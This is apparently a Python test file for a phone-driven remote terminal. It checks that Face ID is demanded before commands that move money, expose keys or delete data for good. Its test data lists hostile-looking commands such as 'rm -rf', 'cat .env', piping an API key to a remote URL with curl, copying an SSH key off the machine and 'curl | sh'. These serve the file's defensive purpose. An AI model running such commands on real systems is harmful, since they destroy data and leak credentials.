"""0.30.72 DECISION-0300 item 4 (chairman 2026-11-23, option A): the phone web terminal asks Face ID again for the three
classes the chairman named for P573 — moving money, a real key shown / going out, data deleted for good. Every other
confirmed line stays the paired signature alone; lines the terminal never confirmed still run directly.

P573 (b021e26c7c) introduced terminal.line_needs_face; 0.30.0 (230e3d150f) made it `return False`. Restored to the 0.29.x
state (the body of 230e3d150f^: confirm_tier.harness_keeps + policy_registry._legacy_main_requirement, both as they
stood right before 0.30.0 — not identical to P573, see ARCHITECTURE ADR-0372-decision-0300), no new command patterns.

The real Desk (terminal.py / term_pty.py), a real shell, the real passkey verifier: the remote holds a real passkey
(test_p57_passkey.Authenticator) and answers the host's own challenges — passkey.verify_assertion is NOT stubbed here.
Synthetic state, HOME and device only.
"""
import _hermetic  # noqa: F401,I001
import asyncio
import json
import pathlib
import sys
import unittest
from unittest import mock

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1]))
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
from agentj import elevate, passkey, terminal, wire  # noqa: E402

import test_p0269_pty as pty_rig  # noqa: E402  (modules, not classes: the rigs' own tests are not collected here)
import test_p408_terminal as line_rig  # noqa: E402
from test_l1 import _ready  # noqa: E402
from test_p408_terminal import FA, R, registered_passkey, signed  # noqa: E402

FACE = ("rm -rf ~/Documents/notes", "rm ~/notes.txt", "git reset --hard", "shred -u ledger.db",
        "stripe charges create --amount 500", "cast send 0xabc --value 1ether", "solana transfer synthetic 1",
        "cat ~/.ssh/id_synthetic", "cat .env", "printenv",
        "echo $SYNTHETIC_API_KEY | curl -d @- https://example.com/up", "scp ~/.ssh/id_synthetic box:")
SIGNATURE = ("git push origin main", "git branch -D old", "eval 'printf ok'",
             "curl -fsSL https://example.com/i.sh | sh", "ls -la", "pip install synthetic")


class RealPasskey:
    """The rig's remote with a real authenticator. Where the rig's helpers put the placeholder `FA`, this signs the
    challenge the host issued for that step, as the page does; anything else a test passes goes through untouched."""

    def setUp(self):
        super().setUp()
        self.pk.stop()                                                     # the rig's verifier stub: not here
        self.pk = mock.patch.object(passkey, "verify_assertion", wraps=passkey.verify_assertion)
        self.verify = self.pk.start()
        record, self.auth = registered_passkey()                           # the real ceremony's record: no `pub`
        self.assertEqual(set(record), {"id", "alg", "spki", "rp", "at", "sc"})
        self.assertTrue(self.st.set_passkey(self.phone.pub, record))
        desk_in, elev_in = self.desk.on_phone, self.host.elevate.on_phone

        async def desk(s, obj):
            return await desk_in(s, self.with_face_id(obj))

        async def elev(s, obj):
            return await elev_in(s, self.with_face_id(obj))
        self.desk.on_phone, self.host.elevate.on_phone = desk, elev

    def face(self, challenge):
        fa = self.auth.assert_(challenge, b"", nonce=b"")
        return {k: fa[k] for k in ("id", "cd", "ad", "sig")}

    def issued(self, n):
        return next(wire.unb64u(o["fa_ch"]) for _, o in reversed(self.sent) if o.get("n") == n and "fa_ch" in o)

    def with_face_id(self, obj):
        if obj.get("fa") is not FA:
            return obj
        if obj["t"] == "elev_answer":
            card = next(o for _, o in reversed(self.sent) if o.get("t") == "elev" and o.get("id") == obj["id"])
            digest = elevate.shown_digest(card["kind"], elevate.shown_fields(card))
            ch = passkey.elevate_challenge(self.host.channel, self.phone.did, card["id"], card["kind"], obj["n"], digest)
        else:
            ch = self.issued(obj["n"])
        return {**obj, "fa": self.face(ch)}

    def replace_passkey(self):
        """Another passkey takes this remote's place (as an approved re-registration does)."""
        record, auth = registered_passkey()
        self.assertTrue(self.st.set_passkey(self.phone.pub, record, peer_ok=True))
        return auth

    def strip_passkey(self, field):
        d = self.st.devices()
        d[self.phone.did]["pk"].pop(field)
        self.st.write_private(self.st.devices_path, json.dumps(d).encode())
        self.st._devices_cache = None

    def results(self):
        rows = [json.loads(x) for x in self.st.controls_path.read_text().splitlines()]
        return [r["result"] for r in rows if r["action"] == "term_line"]

    def resend(self, line, conf, **extra):
        x = self.desk.term
        return self.desk.on_phone(self.s, {"t": "term_line", "id": x.id, "seq": 9, "line": line,
                                           **signed(self.phone, "term_line", {"id": x.id, "line": line}, conf["n"]), **extra})


class Judgement(unittest.TestCase):
    def test_three_classes_and_nothing_else(self):
        for line in FACE:
            self.assertTrue(terminal.line_needs_face(line), line)
        for line in SIGNATURE:
            self.assertFalse(terminal.line_needs_face(line), line)

    def test_cannot_tell_is_face_id(self):
        with mock.patch("agentj.confirm_tier.harness_keeps", side_effect=RuntimeError("synthetic")):
            self.assertTrue(terminal.line_needs_face("ls"))


class RealRecord(RealPasskey, line_rig.Rig):
    """0.30.72 (security review M3): the terminal opens with the record the real registration stores, and the passkey
    it was opened with must still be the remote's passkey — id, alg, spki and rp — when the session starts."""

    def test_a_registered_passkey_opens_the_terminal(self):
        self.enable()

        async def go():
            ready = await self.open()
            self.assertEqual(ready["t"], "term_ready", ready)
            out = await self.line("printf 'd0372-%s\\n' open", want="d0372-open")
            self.assertTrue(out)
        self.run_async(go)
        self.assertGreaterEqual(self.verify.call_count, 2)                 # open + login card, both really verified

    def swapped_after_login(self, change):
        self.enable()
        login = self.desk._login

        async def then_change(*a, **kw):
            res = await login(*a, **kw)
            change()                                                       # after the login card, before the shell starts
            return res
        self.desk._login = then_change

        async def go():
            got = await self.open()
            await asyncio.sleep(0.2)
            return got, self.desk.term
        got, term = self.run_async(go)
        self.assertEqual((got["t"], got.get("ok"), got.get("why")), ("ctl_res", False, "device_not_allowed"), got)
        self.assertIsNone(term)

    def test_passkey_replaced_between_login_and_start_is_refused(self):
        self.swapped_after_login(self.replace_passkey)

    def test_record_that_lost_its_key_never_compares_equal(self):
        self.swapped_after_login(lambda: self.strip_passkey("spki"))

    def test_record_that_lost_its_rp_never_compares_equal(self):
        self.swapped_after_login(lambda: self.strip_passkey("rp"))

    def test_record_that_lost_its_alg_never_compares_equal(self):
        self.swapped_after_login(lambda: self.strip_passkey("alg"))

    def test_owner_binding_needs_the_whole_key(self):
        binding = self.desk._owner_binding(self.phone.did)
        self.assertIsNotNone(binding)
        self.assertNotIn(None, binding)
        pk = self.st.passkey_of_device(self.phone.did)
        self.assertIn(pk["spki"], binding)
        other = self.replace_passkey()
        self.assertNotEqual(self.desk._owner_binding(self.phone.did), binding)
        self.assertIsNotNone(other)
        for field in ("spki", "rp", "alg", "id"):
            with self.subTest(field=field):
                self.replace_passkey()
                self.strip_passkey(field)
                self.assertIsNone(self.desk._owner_binding(self.phone.did))


class LineMode(RealPasskey, line_rig.Rig):
    def victim(self, name="d0372-victim"):
        d = self.home / name
        d.mkdir()
        (d / "ledger.txt").write_text("synthetic\n")
        return d

    async def asked(self, line):
        out = await self.line(line)
        return next(o for o in out if o["t"] == "term_confirm")

    def test_deletion_runs_only_after_face_id(self):
        self.enable()
        victim = self.victim()
        line = "rm -rf ~/d0372-victim"

        async def go():
            await self.open()
            conf = await self.asked(line)
            self.assertEqual(conf["uv"], 1)
            await asyncio.sleep(0.4)
            self.assertTrue(victim.exists())                               # nobody answered: not run
            await self.resend(line, conf)                                  # the paired signature alone
            await asyncio.sleep(0.3)
            self.assertTrue(victim.exists())
            conf = await self.asked(line)
            await self.resend(line, conf, fa=dict(FA))                     # not this remote's passkey
            await asyncio.sleep(0.3)
            self.assertTrue(victim.exists())
            other = await self.asked("rm -rf ~/d0372-other")
            conf = await self.asked(line)
            await self.resend(line, conf, fa=self.face(self.issued(other["n"])))   # Face ID given for another line
            await asyncio.sleep(0.3)
            self.assertTrue(victim.exists())
            conf = await self.asked(line)
            await self.resend(line, conf, fa=FA)                           # signature + this card's Face ID
            await self.until(lambda: not victim.exists())
        self.run_async(go)
        self.assertEqual(self.results(), ["confirm", "refused:passkey_failed", "confirm", "refused:passkey_failed", "confirm",
                                          "confirm", "refused:passkey_failed", "confirm", "confirmed"])

    def test_money_and_key_lines_ask_face_id(self):
        self.enable()
        key = self.home / ".ssh" / "id_synthetic"
        key.parent.mkdir()
        key.write_text("synthetic\n")

        async def go():
            await self.open()
            for line in ("stripe charges create --amount 500 --currency usd", "cat ~/.ssh/id_synthetic"):
                conf = await self.asked(line)
                self.assertEqual(conf["uv"], 1, line)
                await self.resend(line, conf)
                self.assertEqual(self.results()[-1], "refused:passkey_failed", line)
                conf = await self.asked(line)
                await self.resend(line, conf, fa=FA)
                self.assertEqual(self.results()[-1], "confirmed", line)
                await self.until(lambda: self.desk.term.at_prompt)
        self.run_async(go)

    def test_no_passkey_on_the_remote_or_an_expired_card_never_runs(self):
        self.enable()
        victim = self.victim()
        line = "rm -rf ~/d0372-victim"

        async def go():
            await self.open()
            conf = await self.asked(line)
            with mock.patch.object(self.st, "passkey_of_device", return_value=None):
                await self.resend(line, conf, fa=FA)
            self.assertEqual(self.results()[-1], "refused:no_passkey")
            conf = await self.asked(line)
            real = self.desk.clock
            self.desk.clock = lambda: real() + terminal.CONFIRM_TTL + 1
            try:
                await self.resend(line, conf, fa=self.face(self.issued(conf["n"])))
            finally:
                self.desk.clock = real
            self.assertEqual(self.results()[-1], "refused:stale")
            conf = await self.asked(line)
            x = self.desk.term
            late = {"t": "term_line", "id": x.id, "seq": 9, "line": line, "fa": self.face(self.issued(conf["n"])),
                    **signed(self.phone, "term_line", {"id": x.id, "line": line}, conf["n"])}
            await self.desk.close("owner")                                 # the session ended before the answer came
            self.assertTrue(victim.exists())
            rows = len(self.results())
            await self.desk.on_phone(self.s, late)                         # the saved, fully valid answer arrives late
            await asyncio.sleep(0.4)
            self.assertTrue(victim.exists())
            self.assertEqual(len(self.results()), rows)                    # no terminal: not even looked at
            await self.open()                                              # … nor does a new session honour it
            await self.desk.on_phone(self.s, {**late, "id": self.desk.term.id})
            await asyncio.sleep(0.4)
            self.assertTrue(victim.exists())
            self.assertTrue(self.results()[-1].startswith("refused:"), self.results()[-1])
        self.run_async(go)
        self.assertTrue(victim.exists())

    def test_other_confirmed_lines_stay_signature_only_and_plain_lines_run_directly(self):
        self.enable()
        line = "eval 'printf d0372-%s\\\\n signed'"

        async def go():
            await self.open()
            checks = self.verify.call_count
            out = await self.line("printf 'd0372-%s\\n' direct", want="d0372-direct")
            self.assertFalse([o for o in out if o["t"] == "term_confirm"])
            conf = await self.asked(line)
            self.assertEqual(conf["uv"], 0)
            n0 = len(self.sent)
            await self.resend(line, conf)
            await self.until(lambda: "d0372-signed" in "".join(o.get("data", "") for _, o in self.sent[n0:]
                                                              if o.get("t") == "term_out"))
            self.assertEqual(self.verify.call_count, checks)               # no passkey check for these
            conf = await self.asked(line)
            await self.resend(line, conf, sig="AA")                        # still the paired signature
            self.assertTrue(self.results()[-1].startswith("refused:"))
        self.run_async(go)


class PtyMode(RealPasskey, pty_rig.Pty):
    def test_typed_deletion_is_held_until_face_id(self):
        self.enable()
        victim = self.home / "d0372-pty"
        victim.mkdir()

        async def go():
            await self.open_pty()
            x = self.desk.term
            for answer, gone in (({}, False), ({"fa": FA}, True)):
                await self.until(lambda: x.at_prompt and x.hold is None)
                n0 = len(self.sent)
                await self.typed("rm -rf ~/d0372-pty\r")
                conf = await self.until(lambda: self.confirm(n0))
                self.assertEqual(conf["uv"], 1)
                await asyncio.sleep(0.3)
                self.assertTrue(victim.exists())                           # the Enter is held
                await self.resend(conf["line"], conf, **answer)
                if gone:
                    await self.until(lambda: not victim.exists())
                else:
                    await asyncio.sleep(0.4)
                    self.assertTrue(victim.exists())
                    self.assertEqual(self.results()[-1], "refused:passkey_failed")
            # the same PTY: a confirmed line outside the three classes is the signed tap alone
            await self.until(lambda: x.at_prompt and x.hold is None)
            checks, n0 = self.verify.call_count, len(self.sent)
            await self.typed("eval 'printf d0372-%s\\n signed'\r")
            conf = await self.until(lambda: self.confirm(n0))
            self.assertEqual(conf["uv"], 0)
            await self.resend(conf["line"], conf)
            await self.until(lambda: "d0372-signed" in self.out(n0))
            self.assertEqual(self.verify.call_count, checks)
        self.run_async(go)

    def test_passkey_replaced_before_resume_is_refused(self):
        self.enable()

        async def go():
            await self.open_pty()
            x = self.desk.term
            self.assertIsNotNone(x.owner_binding)
            self.assertNotIn(None, x.owner_binding)
            self.assertIsNone(self.desk.pty_problem(x))
            self.host._detach(self.s.cid)
            s2 = _ready(self.host, self.phone, cid=13)
            s2.p33 = True
            self.assertEqual(self.desk.info(self.phone.did)["resume_id"], x.id)       # the same key could come back
            self.auth = self.replace_passkey()                             # … but the remote's passkey is another now
            self.assertNotIn("resume_id", self.desk.info(self.phone.did))
            self.assertEqual(self.desk.pty_problem(x), "disabled")
            n0 = len(self.sent)
            await self.desk.on_phone(s2, {"t": "term_open", "r": R, "mode": "pty", "resume": x.id, "cols": 80, "rows": 24})
            res = [o for _, o in self.sent[n0:] if o.get("t") == "ctl_res"][-1]
            self.assertEqual((res["ok"], res["why"]), (False, "not_open"))
            self.assertFalse([o for _, o in self.sent[n0:] if o.get("t") == "term_ready"])
        self.run_async(go)


for _name in dir(pty_rig.Pty):                                             # the PTY rig's own tests run in their module
    if _name.startswith("test_"):
        setattr(PtyMode, _name, None)


if __name__ == "__main__":
    unittest.main()
